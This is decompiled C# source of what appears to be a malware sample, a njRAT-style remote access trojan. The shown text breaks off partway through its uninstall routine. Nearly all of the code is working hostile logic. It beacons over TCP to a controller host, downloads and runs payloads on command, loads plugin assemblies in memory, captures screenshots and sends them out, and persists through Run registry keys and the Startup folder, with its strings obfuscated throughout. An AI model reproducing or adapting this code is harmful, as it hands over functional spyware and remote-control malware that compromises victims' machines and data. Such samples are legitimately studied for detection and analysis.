// Decompiled with JetBrains decompiler
// Type: nulvifmubgc.A
// Assembly: nulvifmubgc, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 159EA06F-082E-40C6-8D63-FA4323A1A9DF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.kqsl-897cee5c34069c3b55435c40b2345e6a51824f5ef04d68d3296a8c9780f77f72.exe

using \u0033cUN0WFZc1OgOKdEVx;
using ECo8dAxFuP8Y8VDWW5;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace nulvifmubgc
{
  public class A
  {
    public string EXE;
    public string DR;
    public string RG;
    public string VN;
    public string VR;
    public string MTX;
    public Mutex MT;
    public string H;
    public string P;
    public string Y;
    public object kq;
    public FileInfo LO;
    public bool CN;
    public TcpClient c;
    public string WSH;
    private string sf;
    public Computer F;
    public bool NJ;
    public const uint LOCALE_SYSTEM_DEFAULT = 1024;
    public const uint LOCALE_SABBREVCTRYNAME = 7;
    public string SPL;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public A()
    {
      KlMT1MoaNQBQvsuDKb.WmbnijfROQyXM();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.EXE = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(0);
      this.DR = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(24);
      this.RG = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(42);
      this.VN = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(110);
      this.VR = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(130);
      this.MTX = "";
      this.MT = (Mutex) null;
      this.H = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(144);
      this.P = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(186);
      this.Y = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(198);
      this.kq = (object) null;
      this.LO = new FileInfo(Assembly.GetExecutingAssembly().Location);
      this.CN = false;
      this.WSH = "";
      this.sf = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(212);
      this.F = new Computer();
      this.NJ = false;
      this.SPL = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(306);
    }

    [STAThread]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void main() => new A().WL();

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void WL()
    {
      try
      {
        if (this.LO.FullName.ToLower().EndsWith(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(324)))
        {
          int num = (int) Interaction.MsgBox((object) "", MsgBoxStyle.YesNoCancel);
          ProjectData.EndApp();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.MTX = this.RG;
      if (!this.NJ)
      {
        if (Interaction.Command() != null)
        {
          if (Interaction.Command().Length > 0)
          {
            string[] strArray = Strings.Split(Interaction.Command(), \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(336));
            string Left = strArray[0];
            if (Operators.CompareString(Left, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(342), false) == 0)
            {
              try
              {
                this.F.Registry.CurrentUser.SetValue(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(350), (object) \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(358));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              try
              {
                Process processById = Process.GetProcessById(Conversions.ToInteger(strArray[1]));
                processById.WaitForExit(5000);
                try
                {
                  processById.Dispose();
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                Thread.Sleep(5000);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(364), false) == 0)
              Thread.Sleep(5000);
          }
        }
        try
        {
          this.WSH = !System.IO.File.Exists(Interaction.Environ(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(372)) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(388)) ? Environment.GetFolderPath(Environment.SpecialFolder.System) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(496) : Interaction.Environ(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(434)) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(450);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        this.INS();
        try
        {
          Mutex.OpenExisting(this.MTX);
          ProjectData.EndApp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          Mutex.OpenExisting(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(524) + this.MTX);
          ProjectData.EndApp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          this.MT = new Mutex(true, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(532) + this.MTX);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.EndApp();
          ProjectData.ClearProjectError();
        }
        try
        {
          RegistrationServices registrationServices = new RegistrationServices();
          try
          {
            registrationServices.UnregisterAssembly(Assembly.GetExecutingAssembly());
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          if (registrationServices.RegisterAssembly(Assembly.GetExecutingAssembly(), AssemblyRegistrationFlags.SetCodeBase))
          {
            string name = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(540) + Conversions.ToString(this.GetHashCode());
            string path = this.LO.DirectoryName + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(546) + this.LO.Name.Replace(this.LO.Extension, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(552));
            System.IO.File.WriteAllText(path, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(564) + name + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(654));
            Process.Start(this.WSH, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(662) + path + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(668)).WaitForExit(5000);
            try
            {
              System.IO.File.Delete(path);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              registrationServices.UnregisterAssembly(Assembly.GetExecutingAssembly());
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              Mutex.OpenExisting(name);
              ProjectData.EndApp();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        Mutex.OpenExisting(this.MTX);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.MT = new Mutex(true, this.MTX);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.EndApp();
        ProjectData.ClearProjectError();
      }
      new Thread(new ThreadStart(this.RC), 1).Start();
      new Thread(new ThreadStart(this.kl), 1).Start();
      int num1 = 0;
      int num2 = 0;
      string Right = "";
      while (true)
      {
        Thread.Sleep(1000);
        try
        {
          checked { ++num1; }
          checked { ++num2; }
          if (num1 > 10)
          {
            num1 = 0;
            if (this.CN && Operators.CompareString(this.ACT(), Right, false) != 0)
            {
              Right = this.ACT();
              if (Right != null && Right.Length > 0)
                this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(674) + this.Y + Right);
            }
          }
          if (num2 > 7)
          {
            num2 = 0;
            try
            {
              this.F.Registry.CurrentUser.OpenSubKey(this.sf, true).SetValue(this.RG, (object) (\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(684) + this.LO.FullName + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(690)));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              this.F.Registry.LocalMachine.OpenSubKey(this.sf, true).SetValue(this.RG, (object) (\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(702) + this.LO.FullName + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(708)));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              System.IO.File.Copy(this.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(720) + this.RG + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(726), true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void kl()
    {
      try
      {
        byte[] B = (byte[]) NewLateBinding.LateIndexGet((object) this.fx((byte[]) NewLateBinding.LateIndexGet((object) this.fx(System.IO.File.ReadAllBytes(this.LO.FullName), \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(738)), new object[1]
        {
          (object) 1
        }, (string[]) null), \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(750)), new object[1]
        {
          (object) 0
        }, (string[]) null);
        bool flag = false;
        ref bool local = ref flag;
        this.kq = RuntimeHelpers.GetObjectValue(this.Plugin(this.ZIP(B, ref local), \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(762)));
        NewLateBinding.LateSet(this.kq, (System.Type) null, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(768), new object[1]
        {
          (object) (this.LO.FullName + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(788))
        }, (string[]) null, (System.Type[]) null);
        NewLateBinding.LateCall(this.kq, (System.Type) null, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(800), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public object Plugin(byte[] ByteOfPlugin, string ClassName)
    {
      Assembly assembly = Assembly.Load(ByteOfPlugin);
      return assembly.CreateInstance(Strings.Split(assembly.FullName, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(814))[0] + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(820) + ClassName);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void Ind(byte[] b)
    {
      string[] strArray1 = Strings.Split(this.BS(ref b), this.Y);
      try
      {
        string Left1 = strArray1[0];
        if (Operators.CompareString(Left1, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(826), false) == 0)
        {
          string str1 = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(834);
          string y = this.Y;
          object kq = this.kq;
          string s = Conversions.ToString(NewLateBinding.LateGet(kq, (System.Type) null, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(842), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
          string str2 = this.ENB(ref s);
          NewLateBinding.LateSetComplex(kq, (System.Type) null, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(854), new object[1]
          {
            (object) s
          }, (string[]) null, (System.Type[]) null, true, false);
          this.Send(str1 + y + str2);
        }
        else if (Operators.CompareString(Left1, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(866), false) == 0)
        {
          string str3 = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(876) + this.Y;
          string str4;
          if (Operators.CompareString(this.GTV(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(886)), "", false) == 0)
          {
            string str5 = str3;
            string s = this.DEB(ref this.VN) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(894) + this.HWD();
            string str6 = this.ENB(ref s);
            string y = this.Y;
            str4 = str5 + str6 + y;
          }
          else
          {
            string str7 = str3;
            string s1 = this.GTV(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(900));
            string s2 = this.DEB(ref s1) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(908) + this.HWD();
            string str8 = this.ENB(ref s2);
            string y = this.Y;
            str4 = str7 + str8 + y;
          }
          this.Send(str4 + this.H + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(914) + this.P + this.Y + this.DR + this.Y + this.EXE + this.Y + Process.GetCurrentProcess().ProcessName);
        }
        else if (Operators.CompareString(Left1, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(920), false) == 0)
        {
          string Left2 = strArray1[1];
          if (Operators.CompareString(Left2, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(932), false) == 0)
            this.STV(strArray1[2], strArray1[3]);
          else if (Operators.CompareString(Left2, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(938), false) == 0)
          {
            this.STV(strArray1[2], strArray1[3]);
            this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(944) + this.Y + strArray1[1] + this.Y + this.GTV(strArray1[1]));
          }
          else
          {
            if (Operators.CompareString(Left2, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(964), false) != 0)
              return;
            this.DLV(strArray1[2]);
          }
        }
        else if (Operators.CompareString(Left1, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(970), false) == 0)
        {
          try
          {
            this.Send(this.inf());
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.CN = false;
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(976), false) == 0)
        {
          byte[] bytes;
          if (strArray1[2].StartsWith(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(984)))
          {
            byte[] B = (byte[]) NewLateBinding.LateIndexGet((object) this.fx((byte[]) NewLateBinding.LateIndexGet((object) this.fx(b, this.Y), new object[1]
            {
              (object) 1
            }, (string[]) null), this.Y), new object[1]
            {
              (object) 1
            }, (string[]) null);
            bool flag = false;
            ref bool local = ref flag;
            bytes = this.ZIP(B, ref local);
          }
          else
            bytes = new WebClient().DownloadData(strArray1[2]);
          this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(990));
          string str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (Interaction.Environ(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1000)) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1012)), A.rn(10)), (object) \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1018)), (object) strArray1[1]));
          System.IO.File.WriteAllBytes(str, bytes);
          Process.Start(str);
        }
        else if (Operators.CompareString(Left1, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1024), false) == 0)
        {
          this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1034));
          string s = this.GTV(strArray1[1]);
          byte[] numArray;
          if (s.Length > 0)
          {
            numArray = Convert.FromBase64String(s);
            this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1044) + this.Y + strArray1[1] + this.Y + Conversions.ToString(0));
          }
          else
          {
            if (strArray1[3].Length == 1)
            {
              this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1052) + this.Y + strArray1[1] + this.Y + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1060));
              return;
            }
            byte[] B = (byte[]) NewLateBinding.LateIndexGet((object) this.fx(b, strArray1[2] + this.Y), new object[1]
            {
              (object) 1
            }, (string[]) null);
            bool flag = false;
            ref bool local = ref flag;
            numArray = this.ZIP(B, ref local);
            if (Conversions.ToBoolean(this.STV(strArray1[1], Convert.ToBase64String(numArray))))
              this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1074) + this.Y + strArray1[1] + this.Y + Conversions.ToString(0));
          }
          object objectValue = RuntimeHelpers.GetObjectValue(this.Plugin(numArray, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1082)));
          NewLateBinding.LateSet(objectValue, (System.Type) null, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1088), new object[1]
          {
            (object) this.H
          }, (string[]) null, (System.Type[]) null);
          NewLateBinding.LateSet(objectValue, (System.Type) null, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1094), new object[1]
          {
            (object) this.P
          }, (string[]) null, (System.Type[]) null);
          NewLateBinding.LateSet(objectValue, (System.Type) null, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1100), new object[1]
          {
            (object) strArray1[2]
          }, (string[]) null, (System.Type[]) null);
          NewLateBinding.LateCall(objectValue, (System.Type) null, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1110), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
          while (!Conversions.ToBoolean(Operators.OrObject((object) !this.CN, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (System.Type) null, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1124), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) true, false))))
            Thread.Sleep(1);
          NewLateBinding.LateSet(objectValue, (System.Type) null, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1134), new object[1]
          {
            (object) true
          }, (string[]) null, (System.Type[]) null);
        }
        else if (Operators.CompareString(Left1, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1144), false) == 0)
        {
          this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1154));
          string s3 = this.GTV(strArray1[1]);
          byte[] numArray;
          if (s3.Length > 0)
          {
            numArray = Convert.FromBase64String(s3);
            this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1164) + this.Y + strArray1[1] + this.Y + Conversions.ToString(0));
          }
          else
          {
            if (strArray1[2].Length == 1)
            {
              this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1172) + this.Y + strArray1[1] + this.Y + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1180));
              return;
            }
            byte[] B = (byte[]) NewLateBinding.LateIndexGet((object) this.fx(b, strArray1[1] + this.Y), new object[1]
            {
              (object) 1
            }, (string[]) null);
            bool flag = false;
            ref bool local = ref flag;
            numArray = this.ZIP(B, ref local);
            if (Conversions.ToBoolean(this.STV(strArray1[1], Convert.ToBase64String(numArray))))
              this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1192) + this.Y + strArray1[1] + this.Y + Conversions.ToString(0));
          }
          object objectValue = RuntimeHelpers.GetObjectValue(this.Plugin(numArray, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1200)));
          string[] strArray2 = new string[5]
          {
            \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1206),
            this.Y,
            strArray1[1],
            this.Y,
            null
          };
          string[] strArray3 = strArray2;
          string s4 = Conversions.ToString(NewLateBinding.LateGet(objectValue, (System.Type) null, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1216), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
          string str = this.ENB(ref s4);
          strArray3[4] = str;
          this.Send(string.Concat(strArray2));
        }
        else if (Operators.CompareString(Left1, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1224), false) == 0)
        {
          try
          {
            int width = Screen.PrimaryScreen.Bounds.Width;
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            int height = bounds.Height;
            Bitmap bitmap = new Bitmap(width, height);
            Graphics graphics1 = Graphics.FromImage((Image) bitmap);
            Graphics graphics2 = graphics1;
            Size size1 = new Size(bitmap.Width, bitmap.Height);
            Size blockRegionSize = size1;
            graphics2.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy);
            try
            {
              Cursor cursor = Cursors.Default;
              Graphics g = graphics1;
              ref Rectangle local = ref bounds;
              Point position = Cursor.Position;
              size1 = new Size(32, 32);
              Size size2 = size1;
              local = new Rectangle(position, size2);
              Rectangle targetRect = bounds;
              cursor.Draw(g, targetRect);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            graphics1.Dispose();
            MemoryStream memoryStream1 = new MemoryStream();
            string S = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1234) + this.Y;
            b = this.SB(ref S);
            memoryStream1.Write(b, 0, b.Length);
            MemoryStream memoryStream2 = new MemoryStream();
            IntPtr callbackData;
            bitmap.GetThumbnailImage(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]), (Image.GetThumbnailImageAbort) null, callbackData).Save((Stream) memoryStream2, ImageFormat.Jpeg);
            memoryStream1.Write(memoryStream2.ToArray(), 0, checked ((int) memoryStream2.Length));
            NewLateBinding.LateCall((object) this, (System.Type) null, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1244), new object[1]
            {
              RuntimeHelpers.GetObjectValue(memoryStream1.ToArray().Clone())
            }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
            memoryStream1.Dispose();
            memoryStream2.Dispose();
            bitmap.Dispose();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1256), false) == 0)
          this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1262));
        else if (Operators.CompareString(Left1, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1268), false) == 0)
        {
          string Left3 = strArray1[1];
          if (Operators.CompareString(Left3, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1276), false) == 0)
            this.UNS();
          else if (Operators.CompareString(Left3, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1282), false) == 0)
          {
            ProjectData.EndApp();
          }
          else
          {
            if (Operators.CompareString(Left3, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1288), false) != 0)
              return;
            Process.Start(this.LO.FullName);
            ProjectData.EndApp();
          }
        }
        else
        {
          if (Operators.CompareString(Left1, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1294), false) != 0)
            return;
          byte[] bytes;
          if (strArray1[1].StartsWith(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1302)))
          {
            byte[] B = (byte[]) NewLateBinding.LateIndexGet((object) this.fx(b, this.Y), new object[1]
            {
              (object) 1
            }, (string[]) null);
            bool flag = false;
            ref bool local = ref flag;
            bytes = this.ZIP(B, ref local);
          }
          else
            bytes = new WebClient().DownloadData(strArray1[1]);
          this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1308));
          this.F.Registry.CurrentUser.SetValue(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1318), (object) "");
          string str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (Interaction.Environ(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1326)) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1338)), A.rn(10)), (object) \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1344)));
          System.IO.File.WriteAllBytes(str, bytes);
          Process.Start(str, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1356) + Conversions.ToString(Process.GetCurrentProcess().Id));
          int num = 0;
          do
          {
            Thread.Sleep(10);
            if (Operators.ConditionalCompareObjectEqual(this.F.Registry.CurrentUser.GetValue(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1366), (object) ""), (object) \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1374), false))
              this.UNS();
            checked { ++num; }
          }
          while (num <= 500);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1380) + this.Y + strArray1[0] + this.Y + exception.Message);
        if (Operators.CompareString(strArray1[0], \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1388), false) == 0 | Operators.CompareString(strArray1[0], \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1396), false) == 0)
          this.Send(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1404));
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void Send(byte[] b)
    {
      if (!this.CN)
        return;
      try
      {
        MemoryStream memoryStream = new MemoryStream();
        memoryStream.Write(b, 0, b.Length);
        memoryStream.Write(this.SB(ref this.SPL), 0, this.SPL.Length);
        lock (this.c.Client)
        {
          this.c.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
          memoryStream.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.CN = false;
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void Send(string S) => this.Send(this.SB(ref S));

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void RC()
    {
      MemoryStream memoryStream = new MemoryStream();
      int num = 0;
label_1:
      while (true)
      {
        try
        {
          if (this.c != null)
          {
            if (this.c.Client.Connected)
            {
              if (this.CN)
              {
                checked { ++num; }
                if (num > 1000)
                {
                  num = 0;
                  lock (this.c.Client)
                  {
                    if (this.c.Client.Poll(-1, SelectMode.SelectRead) & this.c.Client.Available <= 0)
                      goto label_15;
                  }
                }
                if (this.c.Available > 0)
                {
                  byte[] buffer = new byte[checked (this.c.Available - 1 + 1)];
                  this.c.Client.Receive(buffer, 0, buffer.Length, SocketFlags.None);
                  memoryStream.Write(buffer, 0, buffer.Length);
                  while (true)
                  {
                    byte[] array = memoryStream.ToArray();
                    if (this.BS(ref array).Contains(this.SPL))
                    {
                      Array Instance = this.fx(memoryStream.ToArray(), this.SPL);
                      new Thread((ParameterizedThreadStart) (a0 => this.Ind((byte[]) a0))).Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object) Instance, new object[1]
                      {
                        (object) 0
                      }, (string[]) null)));
                      memoryStream.Dispose();
                      memoryStream = new MemoryStream();
                      if (Instance.Length == 2)
                        memoryStream.Write((byte[]) NewLateBinding.LateIndexGet((object) Instance, new object[1]
                        {
                          (object) 1
                        }, (string[]) null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object) Instance, new object[1]
                        {
                          (object) 1
                        }, (string[]) null), (System.Type) null, \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1414), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
                      else
                        break;
                    }
                    else
                      break;
                  }
                }
              }
              else
                goto label_15;
            }
            else
              goto label_15;
          }
          else
            goto label_15;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          goto label_15;
        }
        Thread.Sleep(1);
        continue;
label_15:
        while (true)
        {
          this.CN = false;
          try
          {
            this.c.Client.Disconnect(false);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            memoryStream.Dispose();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          memoryStream = new MemoryStream();
          Thread.Sleep(2000);
          try
          {
            this.c = new TcpClient();
            this.c.ReceiveTimeout = -1;
            this.c.SendTimeout = -1;
            this.c.SendBufferSize = 999999;
            this.c.ReceiveBufferSize = 999999;
            this.c.Client.SendBufferSize = 999999;
            this.c.Client.ReceiveBufferSize = 999999;
            num = 0;
            this.c.Client.Connect(this.H, Conversions.ToInteger(this.P));
            this.CN = true;
            this.Send(this.inf());
            goto label_1;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void UNS()
    {
      try
      {
        this.F.Registry.CurrentUser.OpenSubKey(this.sf, true).DeleteValue(this.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
